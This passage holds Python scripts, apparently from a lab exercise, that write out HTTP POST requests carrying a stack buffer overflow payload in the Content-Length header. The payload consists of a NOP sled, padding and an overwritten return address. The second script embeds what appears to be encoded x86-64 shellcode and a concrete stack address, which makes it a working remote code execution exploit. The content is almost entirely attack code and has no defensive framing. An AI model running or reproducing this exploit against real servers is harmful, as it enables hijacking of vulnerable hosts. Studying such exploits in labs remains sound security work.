sys.stdout.write('hello\r\n')
```

```Python
import sys


def generate_malicious_content_length():
    nopsled = '\x90' * 100
    buf = '\xcc' * 200
    pad = 'X' * (1128 - 100 - len(buf))
    rip = '\x41\x42\x43\x44\x45\x46'
    return nopsled + buf + pad + rip


sys.stdout.write('POST / HTTP/1.1\r\n')
sys.stdout.write('Content-Length: ' +
                 generate_malicious_content_length() + '\r\n')
sys.stdout.write('\r\n')
sys.stdout.write('hello\r\n')
```

```Python
import sys


def generate_malicious_content_length():
    nopsled = '\x90' * 100
    buf = ""
    buf += "\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05"
    buf += "\xef\xff\xff\xff\x48\xbb\xb8\xa4\xf1\xb4\x8e\x6e\x83"
    buf += "\xad\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    buf += "\xd2\x8d\xa9\x2d\xe4\x6c\xdc\xc7\xb9\xfa\xfe\xb1\xc6"
    buf += "\xf9\xd1\x6a\xbc\x80\xf3\xb4\x9f\x32\xcb\x24\x5e\xce"
    buf += "\xe1\xee\xe4\x5f\xdb\xa2\xbd\xce\xc3\xec\x81\x6b\xcb"
    buf += "\x9c\x4e\xce\xda\xec\x81\x6b\xcb\x3a\xd2\xa7\xaf\xfc"
    buf += "\x71\xa0\xe9\x8c\xe0\xab\xf4\xc1\x78\x04\xb8\xf5\x21"
    buf += "\xec\x4a\x9b\xec\x07\xed\x82\xcb\xcc\xf1\xe7\xc6\xe7"
    buf += "\x64\xff\xef\xec\x78\x52\x81\x6b\x83\xad"
    pad = 'X' * (1128 - 100 - len(buf))
    # Remove null bytes. strstr() does not function correctly when there are null bytes.
    # It will still work because those bytes we want to write as null bytes are already null bytes.
    rip = '\xf0\xf9\x5a\xf7\xff\x7f'
    return nopsled + buf + pad + rip


payload = 'POST / HTTP/1.1\r\n' + 'Content-Length: ' + \
    generate_malicious_content_length() + '\r\n\r\nhello=world'

sys.stdout.write(payload)
```
